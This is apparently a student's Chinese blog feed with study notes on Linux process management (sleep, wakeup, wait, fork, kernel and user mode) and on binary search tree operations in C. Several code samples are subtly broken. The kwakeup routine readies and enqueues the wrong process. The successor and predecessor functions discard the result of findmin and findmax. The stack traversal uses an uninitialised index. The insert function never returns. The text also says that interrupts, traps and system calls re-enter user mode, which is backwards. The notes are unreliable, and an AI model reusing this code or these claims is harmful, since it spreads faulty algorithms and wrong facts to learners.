ppid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> priority;</span><br><span class="line">    <span class="keyword">int</span> kstack[SSIZE];</span><br><span class="line">&#125;PROC;</span><br></pre></td></tr></table></figure>
<h1 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h1><h2 id="睡眠模式"><a href="#睡眠模式" class="headerlink" title="睡眠模式"></a>睡眠模式</h2><p>​    当进程需要某些当前没有的东西时，它就会在某个事件值上进入休眠状态。为了实现这个操作，我们在上面的PROC结构题中加入event字段，并且实现ksleep函数，使之进入休眠状态。见下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> *ksp;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">int</span> ppid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> priority;</span><br><span class="line">    <span class="keyword">int</span> kstack[SSIZE];</span><br><span class="line">    <span class="keyword">int</span> event;<span class="comment">//睡眠的事件值</span></span><br><span class="line">    <span class="keyword">int</span> exitCode;<span class="comment">//关闭值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">child</span>;</span> <span class="comment">//指向第一个孩子</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">sibling</span>;</span> <span class="comment">//指向第一个兄弟</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span> <span class="comment">//指向父进程</span></span><br><span class="line">&#125;PROC;</span><br></pre></td></tr></table></figure>
<p>​    关于ksleep()函数，主要基于以下想法，即记录事件值，这里的事件值大概指的就是导致目前进程沉睡的事件编号，将当前状态改为SLEEP，另外就是我们需要再声明一个当前沉睡的进程链表，以便于维护，然后调用tswitch()函数放弃使用CPU。大概代码可能像下面一样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ksleep</span><span class="params">(<span class="keyword">int</span> event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    running-&gt;event=event;</span><br><span class="line">    running-&gt;status=SLEEP;</span><br><span class="line">    enqueue(&amp;SleepList,running);</span><br><span class="line">    tswitch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="唤醒操作"><a href="#唤醒操作" class="headerlink" title="唤醒操作"></a>唤醒操作</h2><p>​    在某些情况下，多个进程有可能都会进入睡眠模式，因为很有可能这些进程需要同一个资源。现在我们需要写一个唤醒的算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kwakeup</span><span class="params">(<span class="keyword">int</span> event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROC *p=sleepList;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)<span class="comment">//如果没有睡眠进程，程序直接终止即可。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//在睡眠进程中找到需要</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;event==event)</span><br><span class="line">        &#123;</span><br><span class="line">            sleepList=sleepList-&gt;next;</span><br><span class="line">            p-&gt;status=READY;</span><br><span class="line">            enqueue(&amp;readyList,p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next-&gt;event==event)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;status=READY;</span><br><span class="line">                p-&gt;next=p-&gt;next-&gt;next;</span><br><span class="line">                enqueue(&amp;readyList,p-&gt;next);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    另外值得一提的是被唤醒的进程可能不会立即运行，有可能需要进行等待。</p>
<p>​    ksleep()函数和kwakeup()函数一般用于进程同步，但在特殊情况下也用于同步父进程和子进程。</p>
<h1 id="进程终止"><a href="#进程终止" class="headerlink" title="进程终止"></a>进程终止</h1><p>​    这一小节主要谈论进程的正常终止，即进程调用exit()，进行终止进程</p>
<h2 id="kexit-算法"><a href="#kexit-算法" class="headerlink" title="kexit()算法"></a>kexit()算法</h2><p>​    该算法第一步用来清除用户上下文，然后舍弃子进程，记录退出值，变成孤儿，叫醒父亲。</p>
<p>​    我们现在先来谈论舍弃子进程这一步，原则上来讲父进程要在所有子进程结束之后才能死亡，因为可能存在一些依赖关系，但是在Linux系统中，执行环境独立，没有依赖，这就会出现问题。即可能出现孤儿进程。为了处理这些孤儿，在Linux系统中，进程P1（<strong>也被称为INIT进程</strong>）会收留所有的孤儿进程。为了实现这个步骤，我们要快速找到他的所有子进程。大多数大型操作系统中都通过维护<strong>进程家族树</strong>来跟踪这些关系</p>
<h2 id="进程家族树"><a href="#进程家族树" class="headerlink" title="进程家族树"></a>进程家族树</h2><p>​    用二叉树结构实现，我们容易发现在结构体定义中多了孩子指针，兄弟指针，父亲指针，然后就正常的进行一个遍历即可。</p>
<p>​    另外在结构题中有<strong>exitCode</strong>字段，是进程终止时进程的退出值，然后更改进程状态，叫醒父进程。最后调用一下tswitch() ，该进程彻底结束所有动作，就等着被父进程释放。</p>
<h2 id="等待子进程终止"><a href="#等待子进程终止" class="headerlink" title="等待子进程终止"></a>等待子进程终止</h2><p>​    提一个内核函数kwait(int *status)，用来等待僵尸子进程，如果成功，则返回的pid是僵尸子进程的pid，status包含僵尸子进程的退出代码，另外该函数会将其释放回freeList以便重用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kwait</span><span class="params">(<span class="keyword">int</span> *status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(caller has no child)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">search <span class="keyword">for</span> <span class="title">a</span> <span class="params">(any)</span> ZOMBIE child</span>;</span><br><span class="line">        <span class="keyword">if</span>(found a ZOMBIE child)</span><br><span class="line">        &#123;</span><br><span class="line">            get its pid;</span><br><span class="line">            copy its exitCode to *status;</span><br><span class="line">            <span class="built_in">free</span> it;</span><br><span class="line">            <span class="keyword">return</span> its pid;</span><br><span class="line">		&#125;</span><br><span class="line">        ksleep(running);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    该程序会找到僵尸子进程并收集其pid和返回代码，将其借入freeList并返回其pid，如果没有子进程就会返回-1。否则将会让当前进程休眠，直到找到僵尸子进程。另外就是如果该程序有多个子进程，就可能需要多次调用该程序。</p>
<p>​    另外这里需要提一下，如果INIT进程被卡住或者死亡，系统将会停止工作。</p>
<h1 id="Linux中的进程"><a href="#Linux中的进程" class="headerlink" title="Linux中的进程"></a>Linux中的进程</h1><p>​    上面一直在讨论MT系统中的进程管理，现在来正式讨论Linux中的进程管理。</p>
<h2 id="进程来源"><a href="#进程来源" class="headerlink" title="进程来源"></a>进程来源</h2><p>​    在操作系统启动时，会强制创建一个PID=0的初始进程，通过分配PROC结构体进行创建并初始化，让当前的running指向它，然后执行初始进程P0。P0继续初始化系统硬件和内核数据结构，然后它挂载一个根文件系统，这样就可以开始使用文件系统了。</p>
<p>​    经历过以上过程之后，P0算是完成了它的操作，接下来它会复制一个子进程P1，将进程切换为以用户模式运行P1</p>
<h2 id="INIT和守护进程"><a href="#INIT和守护进程" class="headerlink" title="INIT和守护进程"></a>INIT和守护进程</h2><p>​    当P1开始运行时，执行映像改为INIT程序，因此P1通常也被称为之前提到过的<strong>INIT</strong>进程。随后P1开始复制出各种各样的子进程。它的大多数子进程都是用来提供<strong>系统服务</strong>的，一般在后台运行，不与用户交互，这样的进程称为<strong>守护进程</strong>，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syslogd: 记录守护进程</span><br><span class="line">inetd: 互联网服务守护进程</span><br><span class="line">httpd: HTTP服务守护进程</span><br></pre></td></tr></table></figure>
<h2 id="登录进程"><a href="#登录进程" class="headerlink" title="登录进程"></a>登录进程</h2><p>​    P1也复制出了多个LOGIN进程，每个终端上一个。每个LOGIN进程打开三个与自己终端相关联的文件流，即我们之前提到过的：<strong>stdin，stdout，stderr</strong>。每个文件流指向进程堆区中的FILE结构体。每个FILE结构体记录了文件描述符，三者分别是0、1、2，然后LOGIN进程就向stdout显示一个提示输入字符串。</p>
<h2 id="sh进程"><a href="#sh进程" class="headerlink" title="sh进程"></a>sh进程</h2><p>​    大概指的就是shell相关的进程。在用户成功登录后，LOGIN进程获取用户gid和uid，从而成为用户的进程。接下来用户进程执行sh，所以用户进程也常被称为sh进程。对于输入的每个命令，sh会复刻一个子进程，并等待子进程终止。子进程将其执行映像更改为命令文件并执行命令程序。然后就是唤醒操作。这时候联系一下之前学的shell的相关命令就会有豁然开朗的感觉！</p>
<p>​    此外，sh还指出<strong>I/O重定向</strong>和通过<strong>管道</strong>连接的多个命令。</p>
<h2 id="进程执行模式"><a href="#进程执行模式" class="headerlink" title="进程执行模式"></a>进程执行模式</h2><p>​    进程以<strong>内核模式（Kmode）</strong>和<strong>用户模式（Umode）</strong>两种模式执行。在每种执行模式下，一个进程有一个执行映像。</p>
<p>​    通常情况下，进程在Umode下的映像都不相同，但是在内核模式下，除了进程自己的Kstack不同，剩下的全都相同。</p>
<p>​    在进程的生命周期中，会在两种模式下进行多次迁移。最初都在Kmode中产生并执行，然后在该模式下可以通过CPU的状态寄存器切换到U模式，但是在Umode下，由于权限的原因，不能随意更改CPU状态。只有以下三种方法可以重新进入Umode：</p>
<ol>
<li><strong>中断</strong>：由外部设备发送给CPU中断信号，请求CPU服务。当中断发生时，Umode无法处理，CPU将进入Kmode处理中断，进而进程进入Kmode</li>
<li><strong>陷阱</strong>：陷阱是错误条件，一些错误条件被CPU识别为异常，使CPU进入Kmode处理错误。在Linux中，内核陷阱处理程序将陷阱原因转换为信号编号，并将其传递给进程。</li>
<li><strong>系统调用</strong>：<strong>syscall</strong>是一种允许Umode进程进入Kmode以执行内核函数的机制。当某进程执行完内核函数后，期望结果和一个返回值被返回到Umode，如果发生错误，外部全局变量errno会包含ERROR代码，可使用库函数<strong>perror</strong>打印错误信息</li>
</ol>
<h1 id="进程管理的系统调用"><a href="#进程管理的系统调用" class="headerlink" title="进程管理的系统调用"></a>进程管理的系统调用</h1><p>​    这一节主要用来讨论以下函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fork(),wait(),exec(),<span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>
<p>​    他们每一个都是发出实际系统调用的库函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c,<span class="keyword">int</span> d)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​    其中第一个参数是系统调用号，后三个参数表示对应核函数的参数</p>
<h2 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h2><p>​    该函数主要用来创建子进程并返回子进程的pid，如果fork失败则返回-1。在Linux中，每个用户只能允许在同一时间内有数量有限的进程，可以通过ulimit -a来实现。</p>
<p>​    对于当前的进程Pi，当其调用fork函数时，会进入Kmode模式执行相应的kfork函数，然后创建一个新的子进程，两进程用户模式下的映像完全相同。然后父进程会返回到原来的模式下。</p>
<p>​    接下来父进程和子进程都会执行自己的Umode映像，但是两者是完全相同的，我们给出下面一个程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;THIS IS %d my parent %d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">    pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;THIS IS PROCESS %d MY child %d\n&quot;</span>,getpid(),pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;this is process %d parent=%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    另外此处有个奇怪的点，就是用外置终端和vscode自带的输出框运行结果不一样，目前还没搞清楚这是怎么回事。用vscode1进行调试会因为权限不够无法切入内核。不过目前认为是父进程和子进程的并发导致的。或许是因为在这里在子进程死亡之后父进程才被唤醒导致的？<del>幸运的是接下来他就给出了解释</del></p>
<h2 id="进程的执行顺序"><a href="#进程的执行顺序" class="headerlink" title="进程的执行顺序"></a>进程的执行顺序</h2><p>​    在fork完成后，子进程和其他所有进程竞争CPU运行时间，这取决于<strong>调度优先级</strong>，而优先级呈动态变化。接下来的程序呈现了这一点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;PARENT %d CHILDE %d\n&quot;</span>,getpid(),pid);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent %d EXIT\n&quot;</span>,getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child %d start my parent=%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">        sleep(<span class="number">1.5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child exit %d my parent=%d\n&quot;</span>,getpid(),getppid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    除了sleep函数，剩下还有两种方式可以影响进程的执行顺序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nice(<span class="keyword">int</span> inc) <span class="comment">//将进程优先级增大，降低其调度优先级，触发进程切换。</span></span><br><span class="line">sched_yield(<span class="keyword">void</span>) <span class="comment">//使当前调用进程放弃CPU，允许优先级更高的其他进程先运行，但是如果当前进程优先级最高，则会继续运行</span></span><br></pre></td></tr></table></figure>
<h2 id="进程终止-1"><a href="#进程终止-1" class="headerlink" title="进程终止"></a>进程终止</h2><h3 id="正常终止"><a href="#正常终止" class="headerlink" title="正常终止"></a>正常终止</h3><p>​    C程序main函数由crt0.o调用，如果程序执行成功，main函数最终会返回到这里，调用exit(value)终止进程，它会做一些清理工作，然后调用_exit(value)，使进程终止。在main函数中的任意位置都可以调用exit。进程也可能直接调用_终止进程而不清理，但是他会告诉它爸爸，让他爸爸来清理他。</p>
<h3 id="异常终止"><a href="#异常终止" class="headerlink" title="异常终止"></a>异常终止</h3><p>​    在执行程序过程中会遇到各种各样的错误，它们被称为异常。这些东西似乎都在之前讨论过了…</p>
<h2 id="等待子进程终止-1"><a href="#等待子进程终止-1" class="headerlink" title="等待子进程终止"></a>等待子进程终止</h2><p>​    在任何时候，系统都可以使用wait系统调用等待僵尸子进程，该函数返回僵尸子进程的PID，然后status包含僵尸子进程的exitCode。另外该函数也会释放僵尸子进程，以便重新使用。该调用将会调用内核中的<strong>kwait</strong>函数，和上文描述的算法完全相同。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>系统编程</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>系统编程</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树与红黑树</title>
    <url>/2021/10/10/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E7%BA%A2%E9%BB%91%E6%A0%91/</url>
    <content><![CDATA[<h1>二叉搜索树</h1>
<p>​	其实在之前对于二叉搜索树已经非常熟悉了，这里主要是打算再总结一下</p>
<h2 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h2>
<p>​	二叉搜索树结点定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;<span class="comment">//结点关键字</span></span><br><span class="line">    <span class="keyword">int</span> data;<span class="comment">//结点数据</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">left</span>;</span><span class="comment">//左结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">right</span>;</span><span class="comment">//右结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span> *<span class="title">parent</span>;</span><span class="comment">//父结点</span></span><br><span class="line">&#125;trnode;</span><br></pre></td></tr></table></figure>
<p>​	二叉搜索树满足所有结点的左子树的关键字小于该结点，所有右子树的关键字大于该结点。用中序遍历可以输出所有元素</p>
<h2 id="遍历二叉搜索树"><a class="header-anchor" href="#遍历二叉搜索树">¶</a>遍历二叉搜索树</h2>
<p>​	主要写一下中序遍历的递归和非递归形式吧，其实很简单了，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归，形式简洁</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inordertree</span><span class="params">(trnode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inordertree(root-&gt;left);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, root-&gt;data);</span><br><span class="line">    inordertree(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//非递归，用栈来实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inordertreebystack</span><span class="params">(trnode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    trnode *Stack[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">    trnode *node = root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(node!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Stack[top++] = node;</span><br><span class="line">            node = node-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                node=Stack[top<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, node-&gt;data);</span><br><span class="line">                top--;</span><br><span class="line">                node = node-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	时间复杂度：$O(n)$</p>
<h2 id="查询二叉搜索树"><a class="header-anchor" href="#查询二叉搜索树">¶</a>查询二叉搜索树</h2>
<p>​	查询的内容有很多，包括查询最大最小值，查询有某个给定值的元素。</p>
<h3 id="查找"><a class="header-anchor" href="#查找">¶</a>查找</h3>
<p>​	根据二叉搜索树的性质，很容易给出递归和非递归两种算法，整个和二分查找思路类似</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">searchtree</span><span class="params">(trnode* root,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;key==x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;key&gt;x)</span><br><span class="line">        <span class="keyword">return</span> searchtree(root-&gt;left, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> searchtree(root-&gt;right, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">trnode* <span class="title">searchtreebywhile</span><span class="params">(trnode* root,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    trnode *node = root;</span><br><span class="line">    <span class="keyword">while</span>(node!=<span class="literal">NULL</span>&amp;&amp;node-&gt;key!=x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;key&gt;x)</span><br><span class="line">            node = node-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查询最大和最小关键字"><a class="header-anchor" href="#查询最大和最小关键字">¶</a>查询最大和最小关键字</h3>
<p>​	这里要注意的是二叉搜索树的性质，即左子树关键字永远小于自身关键字，右子树关键字永远大于自身关键字，这样一来代码就很简单了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">findmin</span><span class="params">(trnode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    trnode *node = root;</span><br><span class="line">    <span class="keyword">while</span>(node&amp;&amp;node-&gt;left)</span><br><span class="line">        node = node-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">trnode* <span class="title">findmax</span><span class="params">(trnode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    trnode *node = root;</span><br><span class="line">    <span class="keyword">while</span> (node&amp;&amp;node-&gt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="后继和前驱"><a class="header-anchor" href="#后继和前驱">¶</a>后继和前驱</h3>
<p>​	这里的后继和前驱指的是中序遍历中的后继和前驱，那么后继指的就是比当前元素关键字大的<strong>最小关键字元素</strong>，前驱定义完全对称</p>
<p>​	要查找后继，实际上查找的就是当前元素的<strong>右子树的最左结点</strong>，首先，当前元素的后继肯定不是父结点，因为它的右子树的所有结点都比父结点小而比当前结点大，所以只需要找到右子树中的最小结点即可，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">findnext</span><span class="params">(trnode* x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(x-&gt;right!=<span class="literal">NULL</span>)</span><br><span class="line">        findmin(x-&gt;right);</span><br><span class="line">    trnode *y;</span><br><span class="line">    y = x-&gt;parent;</span><br><span class="line">    <span class="keyword">while</span>(y&amp;&amp;x==y-&gt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        x = y;</span><br><span class="line">        y = x-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​	其实就是分两类讨论，如果当前查询结点有右子树，那么显然就是要找到右子树的最左结点。但是如果没有右子树，就需要向上查找父结点，这时候满足的肯定是y是x的祖先，并且y的左孩子也是x的祖先。</p>
<p>​	查询前驱的代码和查询后继的代码完全对称</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">findpre</span><span class="params">(trnode* x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(x-&gt;left)</span><br><span class="line">        findmax(x-&gt;left);</span><br><span class="line">    trnode *y;</span><br><span class="line">    y = x-&gt;parent;</span><br><span class="line">    <span class="keyword">while</span> (y&amp;&amp;x==y-&gt;left)</span><br><span class="line">    &#123;</span><br><span class="line">        x=y;</span><br><span class="line">        y = x-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	另外算法导论的这部分给出的一些题目还蛮有意思的，有时间可以翻阅一下</p>
<p>​	时间复杂度均为$O(h)$</p>
<h2 id="插入和删除"><a class="header-anchor" href="#插入和删除">¶</a>插入和删除</h2>
<p>​	关于插入操作，其实也很简单，因为二叉搜索树的插入都是插入到叶子节点，所以考虑使用循环直接找到插入位置即可，中间需要记录当前值的父结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">insert</span><span class="params">(trnode* root,trnode *z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    trnode *y;</span><br><span class="line">    trnode *x;</span><br><span class="line">    x = root;</span><br><span class="line">    <span class="keyword">while</span>(x)</span><br><span class="line">    &#123;</span><br><span class="line">        y = x;</span><br><span class="line">        <span class="keyword">if</span>(x-&gt;key&lt;z-&gt;key)</span><br><span class="line">        &#123;</span><br><span class="line">            x = x-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            x = x-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    z-&gt;parent = y;</span><br><span class="line">    <span class="keyword">if</span>(y==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        root = z;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(z-&gt;key&lt;y-&gt;key)</span><br><span class="line">        y-&gt;left = z;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        y-&gt;right = z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​	关于删除操作，相对来说会复杂很多。可以考虑以下分类</p>
<ol>
<li>如果被删结点没有左孩子，那么用右孩子去替换它</li>
<li>如果仅有一个孩子并且为左孩子，那么用左孩子去替换它</li>
<li>否则，有两个孩子，查询当前结点的后继，将当前结点的左子树作为后继的左子树，将后继替换当前结点。这个情况也可以分两类，即当后继就是它的右孩子的时候，直接拉上来替换就行，但是如果不是的话，需要先用后继右孩子替换后继，再用后继替换当前结点</li>
</ol>
<p>​    为了简便起见，我们定义一个子过程<strong>transplant</strong>来用另一棵子树替换一棵子树并成为双亲的孩子节点，代码见下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">trnode* <span class="title">transplant</span><span class="params">(trnode* root,trnode* u,trnode *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u-&gt;parent==<span class="literal">NULL</span>)</span><br><span class="line">        root = v;<span class="comment">//是树根，直接替换</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(u==u-&gt;parent-&gt;left)</span><br><span class="line">    &#123;</span><br><span class="line">        u-&gt;parent-&gt;left = v;<span class="comment">//如果u是左孩子，那么更新左孩子</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        u-&gt;parent-&gt;right = v;<span class="comment">//否则更新右孩子</span></span><br><span class="line">    <span class="keyword">if</span>(v)</span><br><span class="line">        v-&gt;parent = u-&gt;parent;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​	主要的想法就是用v替换u。</p>
<p>​	然后整个删除的代码如下所示。</p>
